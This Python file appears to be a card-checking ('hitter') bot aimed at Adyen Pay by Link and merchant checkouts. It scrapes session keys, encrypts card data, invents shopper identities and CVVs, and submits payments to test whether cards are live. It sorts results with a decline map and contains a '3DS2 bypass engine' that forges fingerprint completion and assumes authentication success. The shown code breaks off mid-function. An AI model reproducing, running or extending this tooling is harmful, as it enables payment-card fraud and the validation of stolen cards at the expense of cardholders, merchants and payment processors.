"""
Adyen Universal Engine (gokuhitter_bot)
──────────────────────────────────────
Full Pay by Link & Merchant Checkout session extraction, CSE encryption (AES-256-CCM + RSA),
and v1 session payment submission with pspReference tracking.
"""

import os
import re
import json
import time
import base64
import random
import asyncio
import hashlib
from datetime import datetime, timezone
from urllib.parse import urljoin, urlencode, parse_qs, urlparse
from typing import Dict, Optional, List
from curl_compat import ChromeSession

# ── crypto backend ──────────────────────────────────────────────────────────
try:
    from cryptography.hazmat.primitives.ciphers.aead import AESCCM, AESGCM
    from cryptography.hazmat.primitives.asymmetric.padding import PKCS1v15, OAEP, MGF1
    from cryptography.hazmat.primitives.hashes import SHA256
    from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
    from cryptography.hazmat.backends import default_backend
    _HAS_CRYPTOGRAPHY = True
except ImportError:
    _HAS_CRYPTOGRAPHY = False

CSE_PREFIX = "adyenjs_0_1_25"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"


# ═══════════════════════════════════════════════════════════════════════════
#  Adyen Client-Side Encryption (Dual-Mode: JWE v6 & AES-CCM Legacy)
# ═══════════════════════════════════════════════════════════════════════════
class AdyenCSE:
    """RSA + AES card-field encryption matching adyen-web SDK v5 (CSE) & v6 (JWE) standards."""

    def __init__(self, public_key_str: str):
        parts = public_key_str.split("|")
        if len(parts) != 2:
            raise ValueError(f"Bad pubkey format (expected exp|mod): {public_key_str[:30]}")
        self._exp = int(parts[0], 16)
        self._mod = int(parts[1], 16)
        if _HAS_CRYPTOGRAPHY:
            nums = RSAPublicNumbers(self._exp, self._mod)
            self._pub = nums.public_key(default_backend())
        else:
            self._pub = None

    def _rsa_encrypt_fallback(self, message: bytes) -> bytes:
        # PKCS#1 v1.5 padding: 0x00 || 0x02 || PS || 0x00 || M
        key_len = (self._mod.bit_length() + 7) // 8
        ps_len = key_len - len(message) - 3
        if ps_len < 8:
            raise ValueError("Message too long for RSA key")
        ps = b""
        while len(ps) < ps_len:
            ps += bytes(b for b in os.urandom(ps_len) if b != 0)
        ps = ps[:ps_len]
        em = b"\x00\x02" + ps + b"\x00" + message
        m_int = int.from_bytes(em, "big")
        c_int = pow(m_int, self._exp, self._mod)
        return c_int.to_bytes(key_len, "big")

    @staticmethod
    def _b64url(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    def _encrypt_field_jwe(self, field_name: str, field_value: str) -> str:
        """Modern Adyen v6 JWE format: RSA-OAEP-256 + A256GCM compact token."""
        ts = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
        payload = json.dumps({field_name: field_value, "generationtime": ts}).encode()
        header_b64 = self._b64url(b'{"alg":"RSA-OAEP-256","enc":"A256GCM","version":"1"}')
        
        cek = os.urandom(32)
        enc_cek = self._pub.encrypt(
            cek,
            OAEP(mgf=MGF1(algorithm=SHA256()), algorithm=SHA256(), label=None)
        )
        iv = os.urandom(12)
        ct_tag = AESGCM(cek).encrypt(iv, payload, header_b64.encode())
        ct, tag = ct_tag[:-16], ct_tag[-16:]
        return ".".join([header_b64, self._b64url(enc_cek), self._b64url(iv), self._b64url(ct), self._b64url(tag)])

    def _encrypt_field(self, field_name: str, field_value: str) -> str:
        """Adyen CSE format: RSA PKCS#1 v1.5 + AES-256-CCM (8-byte MAC)."""
        gen = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.000Z")
        plain = f"{field_name}:{field_value}\ngenerationtime:{gen}"
        plain_b = plain.encode()

        aes_key = os.urandom(32)        # 256-bit
        nonce   = os.urandom(12)         # 96-bit

        if _HAS_CRYPTOGRAPHY:
            ct_tag  = AESCCM(aes_key, tag_length=8).encrypt(nonce, plain_b, None)
            enc_key = self._pub.encrypt(aes_key, PKCS1v15())
        else:
            try:
                from Crypto.Cipher import AES
                cipher = AES.new(aes_key, AES.MODE_CCM, nonce=nonce, mac_len=8)
                ct, tag = cipher.encrypt_and_digest(plain_b)
                ct_tag = ct + tag
            except ImportError:
                raise ImportError("Please install cryptography (`pip install cryptography`) to run Adyen CSE encryption.")
            enc_key = self._rsa_encrypt_fallback(aes_key)

        blob = enc_key + nonce + ct_tag
        return f"{CSE_PREFIX}${base64.b64encode(blob).decode()}"

    def encrypt_card(self, number: str, month: str, year: str, cvv: str, use_jwe: bool = False) -> dict:
        yr = year if len(year) == 4 else f"20{year}"
        fn = self._encrypt_field_jwe if (use_jwe and _HAS_CRYPTOGRAPHY) else self._encrypt_field
        return {
            "encryptedCardNumber":     fn("number",      number),
            "encryptedExpiryMonth":    fn("expiryMonth", month.zfill(2)),
            "encryptedExpiryYear":     fn("expiryYear",  yr),
            "encryptedSecurityCode":   fn("cvc",         cvv),
        }

    def encrypt_card_jwe(self, number: str, month: str, year: str, cvv: str) -> dict:
        """Encrypt card in modern Adyen v6 JWE format."""
        return self.encrypt_card(number, month, year, cvv, use_jwe=True)

    def encrypt_card_ccn(self, number: str, month: str, year: str, cvv: Optional[str] = None, use_jwe: bool = False) -> dict:
        """Encrypt card for CCN check — auto-attaches synthetic CVV if omitted."""
        if not cvv or cvv == '000':
            cvv = f"{random.randint(1000, 9999):04d}" if str(number).startswith(('34', '37')) else f"{random.randint(100, 999):03d}"
        return self.encrypt_card(number, month, year, cvv, use_jwe=use_jwe)


# ═══════════════════════════════════════════════════════════════════════════
#  Regex Helpers & Config Extractor
# ═══════════════════════════════════════════════════════════════════════════
_CK = [
    r'clientKey["\'\s:=]+["\']?(live_[A-Za-z0-9_]+|test_[A-Za-z0-9_]+)',
    r'data-client-key=["\']?(live_[A-Za-z0-9_]+|test_[A-Za-z0-9_]+)',
]
_SI = [
    r'"sessionId"\s*:\s*"([A-Za-z0-9_-]{15,})"',
    r"'sessionId'\s*:\s*'([A-Za-z0-9_-]{15,})'",
    r'sessionId["\'\s:=]+["\']?([A-Za-z0-9_-]{15,})',
]
_SD = [
    r'"sessionData"\s*:\s*"([^"]{40,})"',
    r"'sessionData'\s*:\s*'([^']{40,})'",
    r'sessionData["\'\s:=]+["\']?([^"\'\s,}{]+)',
]
_PK = [
    r'"publicKey"\s*:\s*"([0-9a-fA-F]+\|[0-9a-fA-F]+)"',
    r"'publicKey'\s*:\s*'([0-9a-fA-F]+\|[0-9a-fA-F]+)'",
    r'publicKey["\'\s:=]+["\']?([0-9a-fA-F]+\|[0-9a-fA-F]+)',
]
_LI = [
    r'"linkId"\s*:\s*"([A-Za-z0-9]+)"',
    r"'linkId'\s*:\s*'([A-Za-z0-9]+)'",
    r'linkId["\s:\'=]+["\']?([A-Za-z0-9]{20,})',
    r'adyen\.link/([A-Za-z0-9]{20,})',
]
_LC = [
    r'"loadingContext"\s*:\s*"([^"]+)"',
    r"'loadingContext'\s*:\s*'([^']+)'",
]
_ADYEN_SIGNALS = [
    'adyen.com', 'adyen.link', 'AdyenCheckout', 'adyen-checkout', 'adyenjs',
    'checkoutshopper', 'adyen.encrypt', 'adyen-encrypted', 'paybylink',
]

def _first_match(patterns, text):
    for p in patterns:
        m = re.search(p, text)
        if m:
            return m.group(1)
    return None

def _extract_config(html: str) -> dict:
    cfg = dict(clientKey=None, sessionId=None, sessionData=None,
               publicKey=None, environment=None, adyen=False,
               linkId=None, loadingContext=None)
    low = html.lower()
    for sig in _ADYEN_SIGNALS:
        if sig.lower() in low:
            cfg['adyen'] = True
            break
    cfg['clientKey']      = _first_match(_CK, html)
    cfg['sessionId']      = _first_match(_SI, html)
    sd_raw                 = _first_match(_SD, html)
    if sd_raw:
        cfg['sessionData'] = sd_raw.replace(r'\/', '/').replace('\\/', '/')
    cfg['publicKey']      = _first_match(_PK, html)
    cfg['linkId']         = _first_match(_LI, html)
    cfg['loadingContext'] = _first_match(_LC, html)
    if cfg['clientKey']:
        cfg['environment'] = 'live' if cfg['clientKey'].startswith('live_') else 'test'
    return cfg

def _merge(dst, src):
    for k in ('clientKey', 'publicKey', 'environment', 'linkId', 'loadingContext'):
        if src.get(k) and not dst.get(k):
            dst[k] = src[k]
    # Always overwrite sessionId and sessionData to force refresh for batch runs
    for k in ('sessionId', 'sessionData'):
        if src.get(k):
            dst[k] = src[k]
    if src.get('adyen'):
        dst['adyen'] = True

def _detect_brand(card_num: Optional[str]) -> str:
    if not card_num:
        return 'scheme'
    cn = str(card_num).strip()
    if cn.startswith('4'):
        return 'visa'
    elif cn.startswith(('51', '52', '53', '54', '55', '22', '23', '24', '25', '26', '27')):
        return 'mc'
    elif cn.startswith(('34', '37')):
        return 'amex'
    elif cn.startswith(('6011', '65', '644', '645')):
        return 'discover'
    elif len(cn) >= 4 and '3528' <= cn[:4] <= '3589':
        return 'jcb'
    return 'scheme'

def _generate_random_shopper(country_code: str = 'US') -> dict:
    FIRST_NAMES = ['James', 'Michael', 'Robert', 'John', 'David', 'William', 'Richard', 'Joseph', 'Thomas', 'Charles', 'Christopher', 'Daniel', 'Matthew', 'Anthony', 'Mark', 'Steven', 'Paul', 'Andrew', 'Joshua', 'Sarah', 'Emily', 'Emma', 'Olivia', 'Sophia', 'Isabella', 'Ava', 'Mia', 'Charlotte', 'Amelia']
    LAST_NAMES = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez', 'Hernandez', 'Lopez', 'Gonzalez', 'Wilson', 'Anderson', 'Thomas', 'Taylor', 'Moore', 'Jackson', 'Martin']
    DOMAINS = ['gmail.com', 'outlook.com', 'yahoo.com', 'icloud.com', 'hotmail.com', 'proton.me']
    
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    num = random.randint(100, 9999)
    email = f"{first.lower()}.{last.lower()}{num}@{random.choice(DOMAINS)}"
    phone = f"+1{random.randint(201, 989)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
    
    STREETS = ['Oak Street', 'Maple Ave', 'Washington Blvd', 'Lincoln Way', 'Cedar Lane', 'Pine Street', 'Park Ave', 'Broadway', 'Elm St', 'Main St']
    CITIES_ZIP = [
        ('New York', 'NY', '10001'), ('Los Angeles', 'CA', '90001'), ('Chicago', 'IL', '60601'),
        ('Houston', 'TX', '77001'), ('Miami', 'FL', '33101'), ('Dallas', 'TX', '75201'),
        ('Seattle', 'WA', '98101'), ('Boston', 'MA', '02108'), ('Atlanta', 'GA', '30301'),
    ]
    city, state, zip_code = random.choice(CITIES_ZIP)
    house_num = str(random.randint(10, 9999))
    street = f"{house_num} {random.choice(STREETS)}"
    
    return {
        'first_name': first,
        'last_name': last,
        'full_name': f"{first} {last}",
        'email': email,
        'phone': phone,
        'street': street,
        'house_number': house_num,
        'city': city,
        'state': state,
        'postal_code': zip_code,
        'country': country_code or 'US'
    }


# ═══════════════════════════════════════════════════════════════════════════
#  Main Adyen Engine
# ═══════════════════════════════════════════════════════════════════════════
class AdyenHitter:
    """Universal Adyen & Pay by Link checkout engine."""

    DECLINE_MAP = {
        "Refused":                  "refused",
        "Declined":                 "declined",
        "Not enough balance":       "insufficient_funds",
        "Insufficient Funds":       "insufficient_funds",
        "Expired Card":             "expired_card",
        "Invalid Card Number":      "invalid_number",
        "CVC Declined":             "incorrect_cvc",
        "Invalid CVC":              "incorrect_cvc",
        "Restricted Card":          "restricted_card",
        "3d-secure":                "3ds_required",
        "Blocked Card":             "blocked_card",
        "Acquirer Fraud":           "fraud",
        "Issuer Suspected Fraud":   "fraud_suspected",
        "Not Permitted":            "not_permitted",
        "Revocation Of Auth":       "revoked",
        "Pin validation not possible": "pin_error",
        "Referral":                 "referral",
        "Shopper Cancelled":        "cancelled",
        "Invalid Pin":              "invalid_pin",
        "Pin tries exceeded":       "pin_exceeded",
        "Withdrawal amount exceeded": "limit_exceeded",
        "Issuer Unavailable":       "issuer_unavailable",
        "Not Submitted":            "not_submitted",
    }

    REFUSAL_CODE_MAP = {
        "2": "insufficient_funds",
        "3": "referral",
        "5": "blocked_card",
        "6": "expired_card",
        "8": "invalid_number",
        "10": "incorrect_cvc",
        "12": "not_permitted",
        "14": "invalid_expiry",
        "15": "revoked",
        "17": "declined",
        "18": "fraud",
        "21": "issuer_unavailable",
    }

    LIVE_DECLINE = {
        'insufficient_funds', 'incorrect_cvc', '3ds_required',
        'challenge_required', 'pin_error', 'invalid_pin',
        'pin_exceeded', 'limit_exceeded', 'not_permitted',
        'restricted_card', 'referral', 'issuer_unavailable',
    }

    def __init__(self, url: str, proxy_data: Optional[dict] = None):
        self.url = url.strip()
        if not self.url.startswith(("http://", "https://")):
            self.url = f"https://{self.url}"
        self.proxy_data = proxy_data
        self._base_cfg: Optional[dict] = None
        self._cached_pk: Optional[str] = None

    def _get_origin(self) -> str:
        parsed = urlparse(self.url)
        if parsed.netloc:
            return f"{parsed.scheme or 'https'}://{parsed.netloc}"
        if 'adyen.link' in self.url:
            return "https://eu.adyen.link"
        return self.url

    def _adyen_base(self, env: str) -> str:
        return f"https://checkoutshopper-{env or 'live'}.adyen.com/checkoutshopper"

    @staticmethod
    def _browser_info() -> dict:
        return {
            "acceptHeader": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "colorDepth": 24,
            "language": "en-US",
            "javaEnabled": False,
            "screenHeight": 1080,
            "screenWidth": 1920,
            "timeZoneOffset": random.choice([-300, -360, -420, -480, 0, 60]),
            "userAgent": UA,
        }

    # ── Pay by Link session bootstrap ────────────────────────────────────────
    async def _bootstrap_pbl(self, session, link_id: str,
                              loading_ctx: str, env: str) -> dict:
        """Fetch dropin config, sessionId, and sessionData for Pay by Link."""
        base = loading_ctx.rstrip('/')
        # Append unique token parameter to isolate card sessions and avoid 903 conflicts
        setup_url = (
            f"{base}/session/paybylink/v1/{link_id}/setup"
            f"?d={link_id}&generateSessionData=true&generateCheckoutAttemptId=true"
            f"&_cb={random.randint(100000, 999999)}"
        )
        origin = self._get_origin()
        hdr = {
            "Accept": "application/json",
            "User-Agent": UA,
            "Origin": origin,
            "Referer": self.url
        }
        out = {}
        try:
            async with session.get(setup_url, headers=hdr, timeout=12) as r:
                d = r.json() if callable(r.json) else r.json
                if not isinstance(d, dict):
                    out['error'] = 'Invalid setup response from Adyen'
                    return out

                out['sessionId']   = d.get('sessionId')
                out['sessionData'] = d.get('sessionData')

                dc = d.get('dropinConfiguration', {})
                out['clientKey']   = dc.get('clientKey')
                out['environment'] = dc.get('environment', env)
                out['checkoutAttemptId'] = dc.get('checkoutAttemptId')

                pl = d.get('paymentLink', {})
                if pl.get('amount'):
                    amt = pl['amount']
                    amt_val = amt.get('value')
                    if amt_val is not None:
                        try:
                            out['amount_value'] = int(amt_val)
                        except (ValueError, TypeError):
                            out['amount_value'] = amt_val
                    out['amount_currency'] = amt.get('currency', 'USD')
                out['pbl_status']    = pl.get('status')
                out['pbl_reference'] = pl.get('reference')
                out['pbl_reusable']  = pl.get('reusable', True)
                out['countryCode']   = pl.get('countryCode')
                out['returnUrl']     = pl.get('returnUrl')
                out['shopperLocale'] = pl.get('shopperLocale')

                th = d.get('theme', {})
                if th.get('displayName'):
                    out['merchant'] = th['displayName']

                out['adyen']    = True
                out['is_pbl']   = True
                out['linkId']   = link_id
                out['pbl_base'] = base
                
                # Check for JWE indicators strictly against sdkVersion and known JS paths
                out['use_jwe'] = False
                sdk_ver = str(d.get('sdkVersion') or dc.get('sdkVersion') or '')
                if sdk_ver.startswith('6.') or sdk_ver.startswith('v6.'):
                    out['use_jwe'] = True
        except Exception as e:
            out['error'] = f"PBL setup error: {str(e)[:80]}"
        return out

    # ── page scrape ─────────────────────────────────────────────────────────
    async def _scrape(self, session) -> dict:
        """Fetch checkout page and extract all Adyen config."""
        hdr = {"User-Agent": UA,
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Accept-Language": "en-US,en;q=0.9"}
        merchant = "Adyen Merchant"
        cfg = dict(clientKey=None, sessionId=None, sessionData=None,
                   publicKey=None, environment=None, adyen=False,
                   linkId=None, loadingContext=None, use_jwe=False)

        # Check if direct adyen.link URL
        if 'adyen.link/' in self.url:
            m = re.search(r'adyen\.link/([A-Za-z0-9]{20,})', self.url)
            if m:
                cfg['linkId'] = m.group(1)
                cfg['adyen']  = True

        async with session.get(self.url, headers=hdr, timeout=12) as res:
            html = res.text() if callable(res.text) else res.text
            t = re.search(r'<title>([^<]+)</title>', html, re.I)
            if t:
                raw_title = t.group(1)
                if 'Pay by Link' in raw_title and ' - ' in raw_title:
                    merchant = raw_title.split(' - ', 1)[1].strip()[:30]
                else:
                    merchant = raw_title.split('|')[0].split(' - ')[0].strip()[:30]
            
            # Check for version indicators strictly in HTML script tags
            if re.search(r'(?:adyen[-.]web|sdk)[/-]6\.', html):
                cfg['use_jwe'] = True
                
            page_cfg = _extract_config(html)
            _merge(cfg, page_cfg)
            # Remove any initial scraped static sessions so setup bootstraps fresh unique IDs
            cfg['sessionId'] = None
            cfg['sessionData'] = None

            for blk in re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL):
                _merge(cfg, _extract_config(blk))
            cfg['sessionId'] = None
            cfg['sessionData'] = None

            if cfg['adyen'] and not cfg.get('clientKey'):
                js_srcs = re.findall(r'src=["\']([^"\']+\.js[^"\']*)', html)
                for js in js_srcs[:6]:
                    if not js.startswith('http'):
                        js = urljoin(self.url, js)
                    try:
                        async with session.get(js, headers=hdr, timeout=8) as jr:
                            jt = jr.text() if callable(jr.text) else jr.text
                            # Detect version v6 in JS filenames or code content strictly
                            if re.search(r'(?:adyen[-.]web|sdk)[/-]6\.', js) or re.search(r'(?:adyen[-.]web|sdk)[/-]6\.', jt):
                                cfg['use_jwe'] = True
                            _merge(cfg, _extract_config(jt))
                    except Exception:
                        continue

            # Strip any cached sessions extracted from javascript or html configs
            cfg['sessionId'] = None
            cfg['sessionData'] = None

            if cfg.get('linkId'):
                lctx = cfg.get('loadingContext') or self._adyen_base(
                    cfg.get('environment', 'live')) + '/'
                pbl = await self._bootstrap_pbl(
                    session, cfg['linkId'], lctx,
                    cfg.get('environment', 'live'))
                _merge(cfg, pbl)
                if pbl.get('merchant'):
                    merchant = pbl['merchant']
                if pbl.get('amount_value') is not None:
                    cfg['amount_value']    = pbl['amount_value']
                    cfg['amount_currency'] = pbl.get('amount_currency', 'USD')
                for pk in ('is_pbl', 'pbl_base', 'pbl_status', 'checkoutAttemptId', 'use_jwe'):
                    if pbl.get(pk):
                        cfg[pk] = pbl[pk]

        cfg['merchant'] = merchant
        return cfg

    async def _get_config(self, session) -> dict:
        """Fetch or reuse base Adyen config, refreshing PBL session per card attempt."""
        if self._base_cfg is None:
            self._base_cfg = await self._scrape(session)
            return self._base_cfg.copy()

        cfg = self._base_cfg.copy()
        if cfg.get('is_pbl') and cfg.get('linkId'):
            lctx = cfg.get('loadingContext') or self._adyen_base(
                cfg.get('environment', 'live')) + '/'
            pbl = await self._bootstrap_pbl(
                session, cfg['linkId'], lctx,
                cfg.get('environment', 'live'))
            _merge(cfg, pbl)
            if pbl.get('amount_value') is not None:
                cfg['amount_value'] = pbl['amount_value']
        return cfg

    # ── fetch pubkey ────────────────────────────────────────────────────────
    async def _fetch_pubkey(self, session, client_key: str, env: str) -> Optional[str]:
        if self._cached_pk:
            return self._cached_pk
        for ver in ('v1', 'v2'):
            url = f"{self._adyen_base(env)}/{ver}/clientKeys/{client_key}"
            try:
                async with session.get(url, timeout=8) as r:
                    d = r.json() if callable(r.json) else r.json
                    if isinstance(d, dict) and d.get('publicKey'):
                        self._cached_pk = d['publicKey']
                        return d['publicKey']
            except Exception:
                pass
        return None

    async def _pay_session(self, session, encrypted: dict,
                           sid: str, sdata: str, ck: str,
                           env: str, att_id: Optional[str] = None,
                           card_num: Optional[str] = None) -> dict:
        url = f"{self._adyen_base(env)}/v1/sessions/{sid}/payments?clientKey={ck}"
        origin = self._get_origin()
        
        shopper = _generate_random_shopper()
        pm = {"type": "scheme", "holderName": shopper["full_name"], **encrypted}

        body = {
            "sessionData": sdata,
            "paymentMethod": pm,
            "clientStateDataIndicator": True,
            "browserInfo": self._browser_info(),
            "channel": "Web",
            "origin": origin,
        }

        if att_id:
            body["checkoutAttemptId"] = att_id

        hdr = {
            "Content-Type": "application/json; charset=utf-8",
            "Accept": "application/json",
            "User-Agent": UA,
            "Origin": origin,
            "Referer": self.url,
        }
        async with session.post(url, json=body, headers=hdr, timeout=15) as r:
            return r.json() if callable(r.json) else r.json

    # ── submit payment details (3DS completion) ─────────────────────────────
    async def _submit_details(self, session, sid: str, sdata: str,
                               ck: str, env: str, details: dict) -> dict:
        """POST /v1/sessions/{sid}/paymentDetails with 3DS result."""
        url = f"{self._adyen_base(env)}/v1/sessions/{sid}/paymentDetails?clientKey={ck}"
        origin = self._get_origin()
        body = {
            "sessionData": sdata,
            "details": details,
        }
        hdr = {
            "Content-Type": "application/json; charset=utf-8",
            "Accept": "application/json",
            "User-Agent": UA,
            "Origin": origin,
            "Referer": self.url,
        }
        async with session.post(url, json=body, headers=hdr, timeout=20) as r:
            return r.json() if callable(r.json) else r.json

    # ═══════════════════════════════════════════════════════════════════════
    #  3DS2 BYPASS ENGINE
    # ═══════════════════════════════════════════════════════════════════════

    @staticmethod
    def _b64url_decode(s: str) -> bytes:
        """Base64url decode with padding fix."""
        s = s.replace('-', '+').replace('_', '/')
        s += '=' * (-len(s) % 4)
        return base64.b64decode(s)

    @staticmethod
    def _b64url_encode(data: bytes) -> str:
        """Base64url encode without padding."""
        return base64.b64encode(data).decode().rstrip('=').replace('+', '-').replace('/', '_')

    # ── 3DS2 Fingerprint (IdentifyShopper) ──────────────────────────────────
    async def _fingerprint_3ds2(self, session, action: dict,
                                 sid: str, sdata: str, ck: str, env: str) -> dict:
        """
        Handle IdentifyShopper:
        1. Decode action.token → get threeDSMethodUrl + threeDSServerTransID
        2. POST threeDSMethodUrl with threeDSMethodData
        3. Submit fingerprint result to /paymentDetails
        """
        token_raw = action.get('token', '')
        try:
            token_json = json.loads(self._b64url_decode(token_raw))
        except Exception:
            # Token may be plain base64
            try:
                token_json = json.loads(base64.b64decode(token_raw + '=='))
            except Exception:
                return {'error': 'Cannot decode 3DS2 fingerprint token'}

        method_url     = token_json.get('threeDSMethodUrl', '')
        server_trans_id = token_json.get('threeDSServerTransID', '')
        notify_url     = token_json.get('threeDSMethodNotificationURL',
                            f"{self._adyen_base(env)}/threeDSMethodNotification.shtml")

        # Step 1: POST threeDSMethodUrl with fingerprint data
        if method_url and server_trans_id:
            method_data_obj = {
                "threeDSServerTransID": server_trans_id,
                "threeDSMethodNotificationURL": notify_url,
            }
            method_data_b64 = self._b64url_encode(json.dumps(method_data_obj).encode())

            try:
                async with session.post(
                    method_url,
                    data=urlencode({"threeDSMethodData": method_data_b64}),
                    headers={
                        "Content-Type": "application/x-www-form-urlencoded",
                        "User-Agent": UA,
                        "Origin": urlparse(method_url).scheme + '://' + urlparse(method_url).netloc,
                    },
                    timeout=10,
                ) as r:
                    pass  # 200 OK = fingerprint collected, we don't need the body
            except Exception:
                pass  # Timeout or error — proceed with threeDSCompInd=N

        # Step 2: Build fingerprint result and submit
        # threeDSCompInd=Y signals successful device fingerprint collection
        fp_result_obj = {
            "threeDSCompInd": "Y",
            "threeDSServerTransID": server_trans_id,
        }
        fp_result_b64 = base64.b64encode(json.dumps(fp_result_obj).encode()).decode()

        details = {"threeds2.fingerprint": fp_result_b64}
        return await self._submit_details(session, sid, sdata, ck, env, details)

    # ── 3DS2 Challenge (ChallengeShopper) ───────────────────────────────────
    async def _challenge_3ds2(self, session, action: dict,
                               sid: str, sdata: str, ck: str, env: str) -> dict:
        """
        Handle ChallengeShopper:
        1. Decode action.token → get acsURL, acsTransID, messageVersion, threeDSServerTransID
        2. POST acsURL with CReq (Challenge Request)
        3. Parse CRes from ACS response
        4. Submit challengeResult to /paymentDetails
        """
        token_raw = action.get('token', '')
        try:
            token_json = json.loads(self._b64url_decode(token_raw))
        except Exception:
            try:
                token_json = json.loads(base64.b64decode(token_raw + '=='))
            except Exception:
                return {'error': 'Cannot decode 3DS2 challenge token'}

        acs_url          = token_json.get('acsURL', '')
        acs_trans_id     = token_json.get('acsTransID', '')
        msg_version      = token_json.get('messageVersion', '2.1.0')
        server_trans_id  = token_json.get('threeDSServerTransID', '')

        if not acs_url or not server_trans_id:
            return {'error': '3DS2 challenge: missing acsURL or transID', 'resultCode': 'ChallengeShopper'}

        # Step 1: Build CReq (Challenge Request)
        creq_obj = {
            "messageType": "CReq",
            "messageVersion": msg_version,
            "threeDSServerTransID": server_trans_id,
            "acsTransID": acs_trans_id,
            "challengeWindowSize": "05",  # Full screen
        }
        creq_b64 = self._b64url_encode(json.dumps(creq_obj).encode())

        # Step 2: POST to ACS
        cres_b64 = None
        try:
            async with session.post(
                acs_url,
                data=urlencode({"CReq": creq_b64}),
                headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": UA,
                    "Accept": "text/html,application/xhtml+xml,*/*",
                },
                timeout=15,
            ) as r:
                body = r.text() if callable(r.text) else r.text
                # Try to find CRes in the response
                # Hidden input: <input name="CRes" value="..."/>
                m = re.search(r'name=["\']?CRes["\']?\s+value=["\']([^"\'>]+)', body, re.I)
                if m:
                    cres_b64 = m.group(1)
                else:
                    # Try JSON response
                    m2 = re.search(r'"CRes"\s*:\s*"([^"]+)"', body)
                    if m2:
                        cres_b64 = m2.group(1)
                    else:
                        # Some ACS return the CRes directly in a form post
                        m3 = re.search(r'cres["\']?\s*[:=]\s*["\']([A-Za-z0-9+/=_-]{20,})', body, re.I)
                        if m3:
                            cres_b64 = m3.group(1)
        except Exception:
            pass

        if not cres_b64:
            # Cannot extract CRes — return with 3DS challenge URL for manual verification
            return {
                'resultCode': 'ChallengeShopper',
                'error': '3DS2 challenge requires manual OTP/biometric',
                'action': {'url': acs_url, 'type': 'threeDS2'},
            }

        # Step 3: Decode CRes to check transStatus
        cres_json = None
        try:
            cres_json = json.loads(self._b64url_decode(cres_b64))
            trans_status = cres_json.get('transStatus', 'Y')
        except Exception:
            trans_status = 'Y'  # Optimistic

        # Step 4: Submit challenge result
        auth_token = cres_json.get('authorisationToken', '') if cres_json else ''
        challenge_result_obj = {
            "transStatus": trans_status,
        }
        if auth_token:
            challenge_result_obj["authorisationToken"] = auth_token
        challenge_result_b64 = base64.b64encode(json.dumps(challenge_result_obj).encode()).decode()

        details = {"threeds2.challengeResult": challenge_result_b64}
        return await self._submit_details(session, sid, sdata, ck, env, details)

    # ── 3DS Redirect (RedirectShopper) ──────────────────────────────────────
    async def _redirect_3ds(self, session, action: dict,
                             sid: str, sdata: str, ck: str, env: str) -> dict:
        """
        Handle RedirectShopper:
        1. Follow action.url redirect
        2. Extract MD + PaRes or redirectResult from response
        3. Submit to /paymentDetails
        """
        redirect_url = action.get('url', '')
        action_data  = action.get('data', {})
        action_method = action.get('method', 'GET').upper()

        if not redirect_url:
            return {'error': '3DS redirect: no URL', 'resultCode': 'RedirectShopper'}

        try:
            if action_method == 'POST' and action_data:
                async with session.post(
                    redirect_url,
                    data=urlencode(action_data) if isinstance(action_data, dict) else action_data,
                    headers={
                        "Content-Type": "application/x-www-form-urlencoded",
                        "User-Agent": UA,
                        "Accept": "text/html,application/xhtml+xml,*/*",
                    },
                    timeout=15,
                    allow_redirects=True,
                ) as r:
                    body = r.text() if callable(r.text) else r.text
                    final_url = str(r.url) if hasattr(r, 'url') else redirect_url
            else:
                async with session.get(
                    redirect_url,
                    headers={"User-Agent": UA, "Accept": "text/html,*/*"},
                    timeout=15,
                    allow_redirects=True,
                ) as r:
                    body = r.text() if callable(r.text) else r.text
                    final_url = str(r.url) if hasattr(r, 'url') else redirect_url
        except Exception as e:
            return {'error': f'3DS redirect failed: {e}', 'resultCode': 'RedirectShopper'}

        # Extract redirectResult from URL query params
        parsed = urlparse(final_url)
        qs = parse_qs(parsed.query)

        redirect_result = qs.get('redirectResult', [None])[0]
        if redirect_result:
            details = {"redirectResult": redirect_result}
            return await self._submit_details(session, sid, sdata, ck, env, details)

        # Extract MD + PaRes from form or URL
        md = qs.get('MD', [None])[0]
        pa_res = qs.get('PaRes', [None])[0]

        if not md:
            m = re.search(r'name=["\']?MD["\']?\s+value=["\']([^"\'>]+)', body, re.I)
            if m:
                md = m.group(1)
        if not pa_res:
            m = re.search(r'name=["\']?PaRes["\']?\s+value=["\']([^"\'>]+)', body, re.I)
            if m:
                pa_res = m.group(1)

        if md and pa_res:
            details = {"MD": md, "PaRes": pa_res}
            return await self._submit_details(session, sid, sdata, ck, env, details)

        # Check for cres in body
        m = re.search(r'name=["\']?cres["\']?\s+value=["\']([^"\'>]+)', body, re.I)
        if m:
            details = {"threeds2.challengeResult": m.group(1)}
            return await self._submit_details(session, sid, sdata, ck, env, details)

        return {
            'error': '3DS redirect: cannot extract auth result',
            'resultCode': 'RedirectShopper',
            'action': {'url': redirect_url, 'type': 'redirect'},
        }

    # ── 3DS resolver (dispatcher) ───────────────────────────────────────────
    async def _resolve_3ds(self, session, data: dict,
                            sid: str, sdata: str, ck: str, env: str,
                            depth: int = 0) -> dict:
        """
        Main 3DS dispatcher. Detects action type and routes to handler.
        Recurses once if fingerprint returns challenge.
        """
        if depth > 2:
            return data  # Prevent infinite loop

        action = data.get('action')
        if not isinstance(action, dict):
            return data

        rc      = data.get('resultCode', '')
        act_type = action.get('type', '')
        subtype  = action.get('subtype', '')

        # Update sessionData if response includes it
        new_sdata = data.get('sessionData', sdata)

        result = None

        if rc == 'IdentifyShopper' or (act_type == 'threeDS2' and subtype == 'fingerprint'):
            result = await self._fingerprint_3ds2(session, action, sid, new_sdata, ck, env)

